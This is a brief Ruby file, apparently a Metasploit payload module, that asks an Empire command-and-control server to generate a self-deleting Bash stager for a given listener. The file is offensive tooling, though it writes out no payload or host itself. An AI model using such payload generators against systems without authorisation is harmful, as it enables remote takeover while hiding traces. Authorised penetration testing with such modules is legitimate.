##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
      'Description'=> 'Generates self-deleting Bash Script to execute the Empire stage0 launcher'
    ))
  end

  def stager_generator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'multi/bash')
    return @stagerCode
  end
end
